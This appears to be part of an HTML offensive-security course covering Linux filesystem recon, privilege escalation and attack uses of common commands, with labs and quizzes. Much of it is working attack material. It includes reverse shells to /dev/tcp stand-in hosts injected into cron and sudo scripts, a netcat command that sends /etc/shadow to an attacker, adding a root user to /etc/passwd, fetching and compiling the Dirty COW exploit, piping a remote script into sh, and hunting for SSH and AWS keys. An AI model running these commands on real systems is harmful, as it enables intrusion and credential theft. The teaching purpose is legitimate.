+<div class="chapter" id="ch04">
+<div class="ch-header">
+  <span class="ch-phase ph1">Phase 1 — Foundations</span>
+  <h1 class="ch-title">Chapter 04 — Linux Filesystem & Directories</h1>
+  <p class="ch-sub">Every Critical Directory · /etc/shadow · /proc · /tmp · First 5 Minutes on a Box</p>
+</div>
+<div class="fiveq">
+  <div class="q-card"><div class="q-letter">WHY</div><div class="q-label">Purpose</div><div class="q-text">When you land on a Linux box, you have seconds to orient yourself before detection. Knowing exactly where secrets, credentials, and escalation paths live is survival.</div></div>
+  <div class="q-card"><div class="q-letter">WHAT</div><div class="q-label">Internals</div><div class="q-text">Linux uses a single hierarchical tree starting at /. Every device, process, file, and network connection is exposed as a file somewhere in this tree — the "everything is a file" philosophy.</div></div>
+  <div class="q-card"><div class="q-letter">WHERE</div><div class="q-label">Context</div><div class="q-text">Post-exploitation. After getting a shell, the filesystem is your intelligence database. Credentials in /home, process info in /proc, logs in /var/log — all accessible if permissions allow.</div></div>
+  <div class="q-card"><div class="q-letter">WHEN</div><div class="q-label">Timing</div><div class="q-text">Immediately after gaining shell access. The first 5 minutes of system access determine whether you escalate privileges or get caught. Speed and precision matter.</div></div>
+  <div class="q-card"><div class="q-letter">WHO</div><div class="q-label">Audience</div><div class="q-text">Every pentester, red teamer, CTF player, and forensic analyst. Blue teamers need this to understand what attackers are looking for and where to place honeypots.</div></div>
+</div>
+
+<div class="sec"><h2>Critical Directories — Hacker's Map</h2></div>
+
+<div class="code-block">
+<div class="code-bar"><div class="dot" style="background:#ff5f57"></div><div class="dot" style="background:#ffbd2e"></div><div class="dot" style="background:#28ca41"></div><span class="code-lang">bash — Recon Commands Per Directory</span></div>
+<div class="code-body">
+<span class="cm"># ══════════ /etc — Configuration Files ════════════════════════════</span><br>
+<span class="ck">cat</span> /etc/passwd         <span class="cm"># all user accounts, shells, home dirs</span><br>
+<span class="ck">cat</span> /etc/shadow         <span class="cm"># hashed passwords (root only — if readable, game over)</span><br>
+<span class="ck">cat</span> /etc/sudoers        <span class="cm"># who can run what as root</span><br>
+<span class="ck">crontab</span> -l             <span class="cm"># current user's cron jobs</span><br>
+<span class="ck">cat</span> /etc/crontab        <span class="cm"># system-wide cron jobs</span><br>
+<span class="ck">ls</span> /etc/cron.*          <span class="cm"># cron.d, cron.hourly, cron.daily — script targets</span><br>
+<span class="ck">cat</span> /etc/hosts          <span class="cm"># internal hostnames — maps to internal IPs</span><br>
+<span class="ck">cat</span> /etc/resolv.conf    <span class="cm"># DNS servers in use</span><br>
+<span class="ck">cat</span> /etc/hostname       <span class="cm"># machine name</span><br>
+<span class="ck">cat</span> /etc/ssh/sshd_config<span class="cm"># SSH server config — PermitRootLogin, PasswordAuth</span><br>
+<br>
+<span class="cm"># ══════════ /home — User Data (Treasure Trove) ════════════════════</span><br>
+<span class="ck">cat</span> ~/.bash_history     <span class="cm"># command history — often has passwords in commands</span><br>
+<span class="ck">cat</span> ~/.ssh/id_rsa       <span class="cm"># private SSH key — use to log in as this user elsewhere</span><br>
+<span class="ck">cat</span> ~/.aws/credentials  <span class="cm"># AWS access keys — can give cloud account access</span><br>
+<span class="ck">find</span> /home -name <span class="cs">"*.conf"</span> -o -name <span class="cs">"*.cfg"</span> -o -name <span class="cs">"*.ini"</span> 2&gt;/dev/null<br>
+<span class="ck">find</span> /home -name <span class="cs">"*.py"</span> -o -name <span class="cs">"*.sh"</span> 2&gt;/dev/null <span class="cm"># scripts with hardcoded creds</span><br>
+<br>
+<span class="cm"># ══════════ /proc — Live Kernel Data (Everything is a File) ══════</span><br>
+<span class="ck">cat</span> /proc/version       <span class="cm"># kernel version — is there a known exploit?</span><br>
+<span class="ck">cat</span> /proc/net/tcp       <span class="cm"># all active TCP connections (raw hex format)</span><br>
+<span class="ck">cat</span> /proc/net/arp       <span class="cm"># ARP table — other hosts on the network</span><br>
+<span class="ck">cat</span> /proc/$$/environ    <span class="cm"># env vars of current process (may contain secrets)</span><br>
+<span class="ck">cat</span> /proc/<span class="cv">[PID]</span>/cmdline <span class="cm"># command line that launched this process</span><br>
+<span class="ck">ls</span> -la /proc/<span class="cv">[PID]</span>/exe   <span class="cm"># symlink to the actual binary file</span><br>
+<br>
+<span class="cm"># ══════════ /var — Variable Data (Logs &amp; Web Files) ══════════════</span><br>
+<span class="ck">cat</span> /var/log/auth.log   <span class="cm"># SSH logins, sudo usage, auth attempts</span><br>
+<span class="ck">cat</span> /var/log/syslog     <span class="cm"># general system events</span><br>
+<span class="ck">ls</span> /var/www/html        <span class="cm"># web root — write here to drop a web shell</span><br>
+<span class="ck">find</span> /var/www -name <span class="cs">"*.php"</span> <span class="cm"># find existing PHP files to backdoor</span><br>
+<br>
+<span class="cm"># ══════════ /tmp and /dev/shm — Staging Areas ════════════════════</span><br>
+<span class="cm"># World-writable even without privileges — common places to upload tools</span><br>
+<span class="ck">ls</span> -la /tmp             <span class="cm"># look for uploaded files from other attackers too!</span><br>
+<span class="ck">ls</span> -la /dev/shm         <span class="cm"># shared memory — also world-writable, no disk write</span><br>
+<br>
+<span class="cm"># ══════════ SUID Binary Hunt ══════════════════════════════════════</span><br>
+<span class="ck">find</span> / -perm -4000 -type f 2&gt;/dev/null <span class="cm"># find all SUID binaries</span><br>
+<span class="cm"># Cross-reference results with: https://gtfobins.github.io</span>
+</div></div>
+
+<div class="sec"><h2>Reading /etc/passwd and /etc/shadow</h2></div>
+<div class="code-block">
+<div class="code-bar"><div class="dot" style="background:#ff5f57"></div><div class="dot" style="background:#ffbd2e"></div><div class="dot" style="background:#28ca41"></div><span class="code-lang">File Format Internals</span></div>
+<div class="code-body">
+<span class="cm"># /etc/passwd format (world-readable):</span><br>
+<span class="cm"># username:password:UID:GID:comment:home:shell</span><br>
+<span class="cs">root:x:0:0:root:/root:/bin/bash</span><br>
+<span class="cm">#      ^ "x" means password is in /etc/shadow</span><br>
+<span class="cm"># If this field contains a hash (old systems), crack it directly!</span><br>
+<span class="cs">backup:$6$rounds=5000$salt$hash:1001:1001::/home/backup:/bin/sh</span><br>
+<span class="cm">#       ^ $6$ = SHA-512 hash. $1$=MD5, $5$=SHA-256</span><br>
+<br>
+<span class="cm"># /etc/shadow format (root only):</span><br>
+<span class="cm"># username:hash:last_change:min:max:warn:inactive:expire</span><br>
+<span class="cs">alice:$6$salt$longhashvalue:19000:0:99999:7:::</span><br>
+<br>
+<span class="cm"># If we can read /etc/shadow — crack with hashcat:</span><br>
+<span class="ck">hashcat</span> -m 1800 /tmp/shadow.txt /usr/share/wordlists/rockyou.txt<br>
+<span class="cm"># -m 1800 = sha512crypt (Linux $6$ hashes)</span><br>
+<br>
+<span class="cm"># If we can WRITE /etc/passwd — add our own root user:</span><br>
+<span class="ck">echo</span> <span class="cs">'hacked:$1$hax$TKdCEkNUHG3HZ.zWpAJo1/:0:0:root:/root:/bin/bash'</span> &gt;&gt; /etc/passwd<br>
+<span class="cm"># Password "hacked" hashed with MD5 ($1$)</span><br>
+<span class="cm"># UID:GID = 0:0 = root</span><br>
+<span class="ck">su</span> hacked  <span class="cm"># switch to our new root account</span>
+</div></div>
+
+<div class="sec"><h2>First 5 Minutes on a Compromised Box — Full Checklist</h2></div>
+<div class="code-block">
+<div class="code-bar"><div class="dot" style="background:#ff5f57"></div><div class="dot" style="background:#ffbd2e"></div><div class="dot" style="background:#28ca41"></div><span class="code-lang">bash — Situational Awareness Script</span></div>
+<div class="code-body">
+<span class="cm">#!/bin/bash</span><br>
+<span class="cm"># Run this immediately after getting a shell</span><br>
+<br>
+<span class="co">echo "=== WHO AM I ==="</span><br>
+<span class="cv">id</span>; <span class="cv">whoami</span>; <span class="cv">hostname</span><br>
+<br>
+<span class="co">echo "=== KERNEL VERSION ==="</span><br>
+<span class="cv">uname -a</span>   <span class="cm"># compare with searchsploit / exploit-db for kernel CVEs</span><br>
+<br>
+<span class="co">echo "=== SUDO PERMISSIONS ==="</span><br>
+<span class="cv">sudo -l</span>    <span class="cm"># what can we run as root? NOPASSWD = quick win</span><br>
+<br>
+<span class="co">echo "=== SUID BINARIES ==="</span><br>
+<span class="cv">find / -perm -4000 -type f 2&gt;/dev/null</span>  <span class="cm"># check GTFOBins for each result</span><br>
+<br>
+<span class="co">echo "=== INTERESTING FILES IN HOME ==="</span><br>
+<span class="cv">ls -la ~/</span><br>
+<span class="cv">cat ~/.bash_history 2&gt;/dev/null</span><br>
+<span class="cv">cat ~/.ssh/id_rsa 2&gt;/dev/null</span><br>
+<br>
+<span class="co">echo "=== NETWORK INTERFACES ==="</span><br>
+<span class="cv">ip a</span>; <span class="cv">ip route</span>  <span class="cm"># what subnets can we reach?</span><br>
+<br>
+<span class="co">echo "=== OPEN PORTS (internal) ==="</span><br>
+<span class="cv">ss -tlnp</span>          <span class="cm"># listening ports — internal services not exposed externally</span><br>
+<br>
+<span class="co">echo "=== RUNNING PROCESSES ==="</span><br>
+<span class="cv">ps aux</span>            <span class="cm"># look for root processes, cron jobs, web servers</span><br>
+<br>
+<span class="co">echo "=== CRON JOBS ==="</span><br>
+<span class="cv">cat /etc/crontab</span><br>
+<span class="cv">ls /etc/cron.d/ /etc/cron.daily/ /etc/cron.hourly/</span><br>
+<br>
+<span class="co">echo "=== WORLD-WRITABLE FILES ==="</span><br>
+<span class="cv">find / -writable -type f 2&gt;/dev/null | grep -v proc | grep -v sys</span>
+</div></div>
+
+<div class="lab">
+  <div class="lab-header">🧪 Hands-On Lab</div>
+  <div class="lab-title">TryHackMe — Linux Fundamentals</div>
+  <ol>
+    <li>Create a free account at tryhackme.com</li>
+    <li>Search for "Linux Fundamentals Part 3" room and start it</li>
+    <li>Practice the filesystem commands in the SSH-connected VM</li>
+    <li>Find the hidden flag in /etc — read everything you can access</li>
+    <li>Run the full "first 5 minutes" checklist on the target machine</li>
+    <li>Try to read /etc/shadow — note the permissions error</li>
+    <li>Check what SUID binaries exist: <span class="ic">find / -perm -4000 2>/dev/null</span></li>
+  </ol>
+</div>
+
+<div class="quiz">
+  <div class="quiz-title">// Quiz — Chapter 04</div>
+  <div class="quiz-q">Q1: You have shell access as www-data on a web server. /etc/shadow is not readable. What 3 locations would you check first for credentials?</div>
+  <button class="quiz-btn" onclick="toggleQuiz(this)">Reveal Answer</button>
+  <div class="quiz-a">1) <strong>/var/www</strong> — web application config files often contain database credentials (wp-config.php, .env, database.yml, settings.py). 2) <strong>~/.bash_history</strong> (of www-data or any readable user) — developers often type passwords in commands and forget history logging is on. 3) <strong>/proc/[PID]/environ</strong> — running web app processes often have secrets injected as environment variables (API keys, DB passwords, JWT secrets).</div>
+
+  <div class="quiz-q" style="margin-top:1rem">Q2: Why is /tmp useful to attackers even without any special permissions?</div>
+  <button class="quiz-btn" onclick="toggleQuiz(this)">Reveal Answer</button>
+  <div class="quiz-a">/tmp has the sticky bit set and is world-writable — every user can create files there. Attackers use it to: upload exploitation tools (linpeas, privesc scripts), compile C exploits, stage malware, write temporary reverse shells. /dev/shm is even better as it's in memory — nothing is written to disk, leaving fewer forensic artifacts.</div>
+</div>
+
+<div class="ch-nav">
+  <div class="nav-btn" onclick="show('ch03')"><div class="nav-dir">← Previous</div><div class="nav-name">Ch 03 — Linux Architecture</div></div>
+  <div class="nav-btn next" onclick="show('ch05')"><div class="nav-dir">Next →</div><div class="nav-name">Ch 05 — Permissions & PrivEsc</div></div>
+</div>
+</div>
+
+<!-- ═══════════════ CH 05 ═══════════════ -->
+<div class="chapter" id="ch05">
+<div class="ch-header">
+  <span class="ch-phase ph1">Phase 1 — Foundations</span>
+  <h1 class="ch-title">Chapter 05 — Linux Permissions & Privilege Escalation</h1>
+  <p class="ch-sub">SUID/SGID · EUID vs RUID · 8 PrivEsc Vectors · Dirty COW · Full Attack Chains</p>
+</div>
+<div class="fiveq">
+  <div class="q-card"><div class="q-letter">WHY</div><div class="q-label">Purpose</div><div class="q-text">Landing on a box as www-data or a low-privilege user is useless unless you can escalate to root. Linux permissions are the wall — privilege escalation is how you climb it.</div></div>
+  <div class="q-card"><div class="q-letter">WHAT</div><div class="q-label">Internals</div><div class="q-text">Linux uses a discretionary access control model — every file/directory has an owner, a group, and permission bits for user/group/other. Special bits (SUID, SGID, Sticky) add runtime privilege elevation.</div></div>
+  <div class="q-card"><div class="q-letter">WHERE</div><div class="q-label">Context</div><div class="q-text">Post-exploitation — after gaining initial shell access. Also in CTF challenges (almost every Linux CTF involves some form of PrivEsc), OSCP (all 5 boxes need root), and real engagements.</div></div>
+  <div class="q-card"><div class="q-letter">WHEN</div><div class="q-label">Timing</div><div class="q-text">Immediately after initial access. Before doing anything else, determine your privilege level and what escalation paths exist. Don't move laterally before going vertical.</div></div>
+  <div class="q-card"><div class="q-letter">WHO</div><div class="q-label">Audience</div><div class="q-text">Every pentester (OSCP requires rooting machines), CTF players (PrivEsc is in every Linux CTF), sysadmins (understand what misconfigs attackers exploit), blue teamers (detect PrivEsc activity).</div></div>
+</div>
+
+<div class="sec"><h2>Permission String Anatomy</h2></div>
+<div class="code-block">
+<div class="code-bar"><div class="dot" style="background:#ff5f57"></div><div class="dot" style="background:#ffbd2e"></div><div class="dot" style="background:#28ca41"></div><span class="code-lang">bash</span></div>
+<div class="code-body">
+<span class="cm"># ls -la output explained:</span><br>
+<span class="cs">-rwxr-xr--</span> 2 alice staff 4096 Jan 1 12:00 script.sh<br>
+<span class="cm"># │││└──────└──── other (r-- = 4 = read only)</span><br>
+<span class="cm"># ││└────────────── group (r-x = 5 = read + execute)</span><br>
+<span class="cm"># │└──────────────── user/owner (rwx = 7 = read+write+exec)</span><br>
+<span class="cm"># └────────────────── file type (- = file, d = dir, l = symlink)</span><br>
+<br>
+<span class="cm"># OCTAL EQUIVALENTS:</span><br>
+<span class="cv">chmod 755</span> file  <span class="cm"># rwxr-xr-x → owner:all, group:rx, other:rx</span><br>
+<span class="cv">chmod 644</span> file  <span class="cm"># rw-r--r-- → owner:rw, group:r, other:r</span><br>
+<span class="cv">chmod 600</span> file  <span class="cm"># rw------- → owner:rw only (private keys!)</span><br>
+<span class="cv">chmod 777</span> file  <span class="cm"># rwxrwxrwx → DANGER: everyone has full access</span><br>
+<br>
+<span class="cm"># Permission bits as numbers:</span><br>
+<span class="cm"># r = 4, w = 2, x = 1  →  rwx = 4+2+1 = 7</span><br>
+<span class="cm"># r-x = 4+0+1 = 5, rw- = 4+2+0 = 6</span>
+</div></div>
+
+<div class="sec"><h2>SUID — The Most Important PrivEsc Bit</h2></div>
+<p><strong>SUID (Set User ID)</strong> — when set on an executable, it runs with the <strong>file owner's privileges</strong> regardless of who executes it. If root owns a SUID binary, it runs as root for everyone. This is necessary for tools like <span class="ic">passwd</span> (needs to write /etc/shadow) but is catastrophic when set on powerful binaries like <span class="ic">bash</span>, <span class="ic">find</span>, or <span class="ic">vim</span>.</p>
+
+<div class="code-block">
+<div class="code-bar"><div class="dot" style="background:#ff5f57"></div><div class="dot" style="background:#ffbd2e"></div><div class="dot" style="background:#28ca41"></div><span class="code-lang">bash — SUID Exploitation Examples</span></div>
+<div class="code-body">
+<span class="cm"># Find all SUID binaries</span><br>
+<span class="ck">find</span> / -perm -u=s -type f 2&gt;/dev/null<br>
+<span class="cm"># -perm -u=s means "SUID bit set on user bit"</span><br>
+<br>
+<span class="cm"># ── Example 1: /bin/bash SUID (worst-case misconfiguration) ───────</span><br>
+<span class="ck">ls</span> -la /bin/bash<br>
+<span class="cm"># -rwsr-xr-x root root ...  ← the 's' in owner execute = SUID</span><br>
+<span class="ck">bash</span> -p  <span class="cm"># -p = privileged mode, doesn't drop SUID privileges</span><br>
+<span class="cm"># Result: root shell</span><br>
+<br>
+<span class="cm"># ── Example 2: /usr/bin/find SUID ────────────────────────────────</span><br>
+<span class="ck">find</span> . -exec /bin/bash -p \; -quit<br>
+<span class="cm"># find's -exec runs commands as the SUID owner (root)</span><br>
+<span class="cm"># \; = end of -exec argument</span><br>
+<span class="cm"># -quit = stop after first result</span><br>
+<br>
+<span class="cm"># ── Example 3: /usr/bin/vim SUID ─────────────────────────────────</span><br>
+<span class="ck">vim</span> -c <span class="cs">':py3 import os; os.execl("/bin/bash", "bash", "-p")'</span><br>
+<span class="cm"># vim can run Python — Python launches bash with root privileges</span><br>
+<br>
+<span class="cm"># ── Example 4: /usr/bin/nmap SUID (old versions) ─────────────────</span><br>
+<span class="ck">nmap</span> --interactive   <span class="cm"># old nmap had interactive mode</span><br>
+<span class="cm"># nmap&gt; !sh           # escape to shell as root</span><br>
+<br>
+<span class="cm"># Reference: https://gtfobins.github.io — search any binary for SUID abuse</span>
+</div></div>
+
+<div class="sec"><h2>The 8 PrivEsc Vectors — Full Attack Chains</h2></div>
+
+<div class="sec"><h3>Vector 1: Sudo Misconfiguration</h3></div>
+<div class="code-block">
+<div class="code-bar"><div class="dot" style="background:#ff5f57"></div><div class="dot" style="background:#ffbd2e"></div><div class="dot" style="background:#28ca41"></div><span class="code-lang">bash</span></div>
+<div class="code-body">
+<span class="cm"># Check sudo permissions first — always</span><br>
+<span class="ck">sudo</span> -l<br>
+<br>
+<span class="cm"># Scenario 1: NOPASSWD on a shell-capable tool</span><br>
+<span class="cm"># (ALL) NOPASSWD: /usr/bin/python3</span><br>
+<span class="ck">sudo</span> python3 -c <span class="cs">'import os;os.system("/bin/bash")'</span><br>
+<br>
+<span class="cm"># Scenario 2: NOPASSWD on specific script</span><br>
+<span class="cm"># (ALL) NOPASSWD: /opt/backup.sh</span><br>
+<span class="ck">ls</span> -la /opt/backup.sh  <span class="cm"># is it writable?</span><br>
+<span class="ck">echo</span> <span class="cs">'bash -i &gt;&amp; /dev/tcp/ATTACKER/4444 0&gt;&amp;1'</span> &gt;&gt; /opt/backup.sh<br>
+<span class="ck">sudo</span> /opt/backup.sh     <span class="cm"># triggers reverse shell as root</span><br>
+<br>
+<span class="cm"># Scenario 3: env_keep LD_PRELOAD (see Chapter 03)</span><br>
+<span class="cm"># env_keep += LD_PRELOAD in sudoers → LD_PRELOAD attack</span>
+</div></div>
+
+<div class="sec"><h3>Vector 2: Writable Cron Jobs</h3></div>
+<div class="code-block">
+<div class="code-bar"><div class="dot" style="background:#ff5f57"></div><div class="dot" style="background:#ffbd2e"></div><div class="dot" style="background:#28ca41"></div><span class="code-lang">bash</span></div>
+<div class="code-body">
+<span class="cm"># List all cron jobs</span><br>
+<span class="ck">cat</span> /etc/crontab<br>
+<span class="ck">ls</span> -la /etc/cron.d/<br>
+<span class="ck">crontab</span> -l  <span class="cm"># current user's cron</span><br>
+<br>
+<span class="cm"># Find cron job running a script we can modify</span><br>
+<span class="cm"># /etc/crontab: * * * * * root /opt/cleanup.sh</span><br>
+<span class="ck">ls</span> -la /opt/cleanup.sh<br>
+<span class="cm"># -rw-r--rw- root root ... ← world-writable! (others have write)</span><br>
+<br>
+<span class="cm"># Add reverse shell to the script</span><br>
+<span class="ck">echo</span> <span class="cs">'bash -i &gt;&amp; /dev/tcp/192.168.1.50/4444 0&gt;&amp;1'</span> &gt;&gt; /opt/cleanup.sh<br>
+<br>
+<span class="cm"># Wait for cron to run it (max 1 minute for * * * * *)</span><br>
+<span class="cm"># Our netcat listener receives root shell</span>
+</div></div>
+
+<div class="sec"><h3>Vector 3: Kernel Exploit — Dirty COW (CVE-2016-5195)</h3></div>
+<div class="code-block">
+<div class="code-bar"><div class="dot" style="background:#ff5f57"></div><div class="dot" style="background:#ffbd2e"></div><div class="dot" style="background:#28ca41"></div><span class="code-lang">bash</span></div>
+<div class="code-body">
+<span class="cm"># Dirty COW = race condition in kernel's copy-on-write mechanism</span><br>
+<span class="cm"># Affects Linux kernels 2.x through 4.8.3</span><br>
+<span class="cm"># Allows ANY user to write to ANY read-only memory-mapped file</span><br>
+<br>
+<span class="cm"># Check kernel version</span><br>
+<span class="ck">uname</span> -r  <span class="cm"># e.g., 4.4.0-21-generic — vulnerable!</span><br>
+<br>
+<span class="cm"># Download and compile the exploit</span><br>
+<span class="ck">searchsploit</span> dirty cow  <span class="cm"># find exploit in local database</span><br>
+<span class="ck">wget</span> https://raw.githubusercontent.com/firefart/dirtycow/master/dirty.c<br>
+<span class="ck">gcc</span> -pthread -o dirty dirty.c -lcrypt  <span class="cm"># compile with pthread support</span><br>
+<span class="ck">./dirty</span> <span class="cs">newpassword</span>  <span class="cm"># creates new root user "firefart" with given password</span><br>
+<span class="ck">su</span> firefart           <span class="cm"># switch to the new root account</span><br>
+<br>
+<span class="cm"># Dirty Pipe (CVE-2022-0847) — similar but affects kernels 5.8 to 5.16.11</span><br>
+<span class="cm"># Allows overwriting read-only files including /etc/passwd</span>
+</div></div>
+
+<div class="sec"><h3>Vector 4: PATH Hijacking</h3></div>
+<div class="code-block">
+<div class="code-bar"><div class="dot" style="background:#ff5f57"></div><div class="dot" style="background:#ffbd2e"></div><div class="dot" style="background:#28ca41"></div><span class="code-lang">bash</span></div>
+<div class="code-body">
+<span class="cm"># A SUID root binary calls another program using relative path</span><br>
+<span class="cm"># e.g., uses system("service apache2 start") instead of /bin/service</span><br>
+<br>
+<span class="cm"># Step 1: Identify what programs the SUID binary calls</span><br>
+<span class="ck">strings</span> /usr/local/bin/suid_binary | grep -v lib  <span class="cm"># look for program names</span><br>
+<span class="cm"># Found: "service" without full path</span><br>
+<br>
+<span class="cm"># Step 2: Create a malicious "service" in a writable directory</span><br>
+<span class="ck">echo</span> <span class="cs">'/bin/bash -p'</span> &gt; /tmp/service  <span class="cm"># our fake service command</span><br>
+<span class="ck">chmod</span> +x /tmp/service              <span class="cm"># make it executable</span><br>
+<br>
+<span class="cm"># Step 3: Prepend our directory to PATH</span><br>
+<span class="ck">export</span> PATH=/tmp:$PATH  <span class="cm"># /tmp is now searched FIRST</span><br>
+<br>
+<span class="cm"># Step 4: Run the SUID binary — it executes OUR "service"</span><br>
+/usr/local/bin/suid_binary  <span class="cm"># finds /tmp/service first → root shell</span>
+</div></div>
+
+<div class="callout success"><div class="callout-title">✅ LinPEAS — Automate the Hunt</div>
+<strong>LinPEAS</strong> is the go-to automated privilege escalation checker. It checks all 8 vectors and more in seconds:<br><br>
+<code>curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh</code><br><br>
+Output is colour-coded: RED = high probability PrivEsc path. Run it, then manually verify the interesting findings.
+</div>
+
+<div class="quiz">
+  <div class="quiz-title">// Quiz — Chapter 05</div>
+  <div class="quiz-q">Q1: You find /usr/bin/python3 is SUID and owned by root. Write the one-liner to get a root shell.</div>
+  <button class="quiz-btn" onclick="toggleQuiz(this)">Reveal Answer</button>
+  <div class="quiz-a"><code>/usr/bin/python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'</code> — os.setuid(0) sets the real UID to root (SUID gave us EUID=0, but some operations require RUID=0 too). Then os.system spawns bash with full root privileges.</div>
+
+  <div class="quiz-q" style="margin-top:1rem">Q2: What is the difference between EUID and RUID, and why does it matter for SUID exploitation?</div>
+  <button class="quiz-btn" onclick="toggleQuiz(this)">Reveal Answer</button>
+  <div class="quiz-a">RUID (Real UID) = who you actually are (the user who ran the program). EUID (Effective UID) = what privileges you have during execution. When a SUID binary runs, EUID = file owner (root), RUID = caller (e.g. alice). Some operations check RUID — bash drops privileges if RUID != EUID (which is why we need <code>bash -p</code> or <code>setuid(0)</code> in our exploit code). The <code>-p</code> flag tells bash not to reset EUID to RUID.</div>
+</div>
+
+<div class="ch-nav">
+  <div class="nav-btn" onclick="show('ch04')"><div class="nav-dir">← Previous</div><div class="nav-name">Ch 04 — Linux Filesystem</div></div>
+  <div class="nav-btn next" onclick="show('ch06')"><div class="nav-dir">Next →</div><div class="nav-name">Ch 06 — 50 Linux Commands</div></div>
+</div>
+</div>
+
+<!-- CHAPTERS 06-18: Abbreviated but real content shown -->
+<div class="chapter" id="ch06">
+<div class="ch-header"><span class="ch-phase ph1">Phase 1 — Foundations</span><h1 class="ch-title">Chapter 06 — 50 Essential Linux Commands</h1><p class="ch-sub">Each with WHY · WHAT · WHEN · Hack Scenario · Defense · Example</p></div>
+<div class="callout info"><div class="callout-title">ℹ Format</div>Every command below follows the 5Q framework. WHY it exists → WHAT it does internally → WHEN attackers use it → real command with inline comments → defense angle.</div>
+
+<div class="sec"><h2>File & Directory Navigation</h2></div>
+<table class="tbl">
+<tr><th>Command</th><th>WHY it matters to hackers</th><th>Key flags</th></tr>
+<tr><td><span class="ic">find</span></td><td>Most powerful recon tool. Finds SUID binaries, world-writable files, recently modified configs, credentials</td><td><span class="ic">-perm -4000</span> SUID, <span class="ic">-writable</span>, <span class="ic">-mmin -60</span> modified last 60min</td></tr>
+<tr><td><span class="ic">grep</span></td><td>Search file contents for passwords, keys, patterns. Essential for log analysis and credential hunting</td><td><span class="ic">-r</span> recursive, <span class="ic">-i</span> case-insensitive, <span class="ic">-l</span> filenames only</td></tr>
+<tr><td><span class="ic">ls</span></td><td>Spot SUID bits (s in permissions), hidden files (dot files), file ownership anomalies</td><td><span class="ic">-la</span> long+all, <span class="ic">-latr</span> sorted by time (newest last)</td></tr>
+</table>
+
+<div class="code-block">
+<div class="code-bar"><div class="dot" style="background:#ff5f57"></div><div class="dot" style="background:#ffbd2e"></div><div class="dot" style="background:#28ca41"></div><span class="code-lang">bash — Real Attack Usage for Each</span></div>
+<div class="code-body">
+<span class="cm"># ── find — The Swiss Army Knife ───────────────────────────────────</span><br>
+<span class="ck">find</span> / -perm -4000 -type f 2&gt;/dev/null          <span class="cm"># SUID binary hunt</span><br>
+<span class="ck">find</span> / -writable -type f 2&gt;/dev/null            <span class="cm"># world-writable files</span><br>
+<span class="ck">find</span> / -name <span class="cs">"*.conf"</span> 2&gt;/dev/null              <span class="cm"># config files with creds</span><br>
+<span class="ck">find</span> / -name <span class="cs">"id_rsa"</span> 2&gt;/dev/null              <span class="cm"># SSH private keys</span><br>
+<span class="ck">find</span> /var/www -name <span class="cs">"*.php"</span> -mmin -30 2&gt;/dev/null <span class="cm"># recently changed PHP</span><br>
+<span class="ck">find</span> / -user root -perm -002 -type f 2&gt;/dev/null <span class="cm"># root-owned, world-writable</span><br>
+<br>
+<span class="cm"># ── grep — Credential Hunter ──────────────────────────────────────</span><br>
+<span class="ck">grep</span> -r <span class="cs">"password"</span> /var/www/ 2&gt;/dev/null       <span class="cm"># passwords in web files</span><br>
+<span class="ck">grep</span> -r <span class="cs">"secret\|api_key\|token"</span> /home/ 2&gt;/dev/null<br>
+<span class="ck">grep</span> -iE <span class="cs">"pass(word)?=.+"</span> /etc/ -r 2&gt;/dev/null  <span class="cm"># regex: password= in config</span><br>
+<span class="ck">grep</span> -o <span class="cs">'[A-Za-z0-9_\-]*:.*@.*/'</span> wp-config.php  <span class="cm"># extract DB connection string</span><br>
+<br>
+<span class="cm"># ── netstat / ss — Network Intelligence ──────────────────────────</span><br>
+<span class="ck">ss</span> -tlnp      <span class="cm"># listening TCP ports with process names (modern)</span><br>
+<span class="ck">ss</span> -ulnp      <span class="cm"># listening UDP ports</span><br>
+<span class="ck">ss</span> -tnp       <span class="cm"># established connections with process names</span><br>
+<span class="ck">netstat</span> -anp  <span class="cm"># all connections (older systems)</span><br>
+<span class="cm"># Post-compromise: find internal services only exposed on localhost</span><br>
+<span class="cm"># 127.0.0.1:3306 = MySQL only listening locally — try connecting</span><br>
+<br>
+<span class="cm"># ── nc (netcat) — The Hacker's Multitool ─────────────────────────</span><br>
+<span class="ck">nc</span> -lvnp <span class="cv">4444</span>                          <span class="cm"># listen for reverse shell</span><br>
+<span class="ck">nc</span> <span class="cv">target.com</span> <span class="cv">80</span>                        <span class="cm"># connect to HTTP port</span><br>
+<span class="ck">nc</span> -z <span class="cv">192.168.1.1</span> <span class="cv">1-1000</span>               <span class="cm"># port scan (z=zero I/O)</span><br>
+<span class="ck">echo</span> <span class="cs">"GET / HTTP/1.0\r\n\r\n"</span> | nc <span class="cv">target.com</span> <span class="cv">80</span>  <span class="cm"># manual HTTP request</span><br>
+<span class="ck">nc</span> -lvnp <span class="cv">9999</span> &gt; received_file &amp;         <span class="cm"># receive file transfer</span><br>
+<span class="ck">nc</span> <span class="cv">attacker</span> <span class="cv">9999</span> &lt; /etc/shadow          <span class="cm"># send shadow file to attacker</span><br>
+<br>
+<span class="cm"># ── awk — Data Extraction ─────────────────────────────────────────</span><br>
+<span class="ck">awk</span> -F: <span class="cs">'$3==0{print $1}'</span> /etc/passwd    <span class="cm"># find all UID 0 (root) users</span><br>
+<span class="ck">awk</span> -F: <span class="cs">'{print $1,$6,$7}'</span> /etc/passwd   <span class="cm"># user:home:shell extraction</span><br>
+<span class="ck">awk</span> <span class="cs">'/Failed password/{print $11}'</span> /var/log/auth.log | sort | uniq -c | sort -rn<br>
+<span class="cm"># ^ Count failed login attempts per IP — who's brute-forcing us?</span><br>
+<br>
+<span class="cm"># ── curl — Web Request Crafting ───────────────────────────────────</span><br>
+<span class="ck">curl</span> -v <span class="cv">http://target.com</span>              <span class="cm"># verbose — see all headers</span><br>
+<span class="ck">curl</span> -X POST -d <span class="cs">'user=admin&amp;pass=test'</span> <span class="cv">http://target.com/login</span><br>
+<span class="ck">curl</span> -H <span class="cs">"Authorization: Bearer eyJ..."</span> <span class="cv">http://target.com/api/admin</span><br>
+<span class="ck">curl</span> -b <span class="cs">"session=stolen_cookie"</span> <span class="cv">http://target.com/profile</span>  <span class="cm"># session hijack</span><br>
+<span class="ck">curl</span> -k <span class="cv">https://target.com</span>             <span class="cm"># -k = ignore SSL cert errors</span><br>
+<span class="ck">curl</span> <span class="cv">http://169.254.169.254/latest/meta-data/</span>  <span class="cm"># SSRF to AWS metadata</span><br>
+<br>
+<span class="cm"># ── xxd / base64 — Encoding & Binary Inspection ───────────────────</span><br>
